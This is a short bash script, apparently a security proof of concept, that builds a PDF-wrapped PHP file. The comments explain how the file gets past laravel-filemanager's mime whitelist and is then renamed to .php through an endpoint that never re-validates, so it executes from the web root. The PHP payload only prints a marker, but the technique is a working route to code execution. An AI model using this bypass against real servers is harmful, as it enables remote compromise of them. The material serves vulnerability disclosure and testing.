#!/usr/bin/env bash
# LFM-01 PoC payload builder — HARMLESS MARKER ONLY.
#
# Builds poc.pdf: a minimal %PDF wrapper around a PHP marker. The PDF wrapper
# passes laravel-filemanager's default application/pdf mime whitelist (the
# direct .php upload is correctly blocked); the rename endpoint is the bypass
# that never re-validates. The PHP body only echoes a fixed marker plus
# md5("poc") — no system(), exec() or any other command/IO functionality.
#
# Expected output once the renamed file is executed via the web root:
#   LFM-01-TEST-302fac1d6d73cf4fdf2c9919195df864
set -euo pipefail

OUT="${1:-poc.pdf}"

{
  printf '%%PDF-1.4\n'
  printf '<?php echo "LFM-01-TEST-".md5("poc"); ?>\n'
  printf '%%%%EOF\n'
} > "$OUT"

echo "[+] Wrote $OUT (php mime_content_type -> application/pdf)"
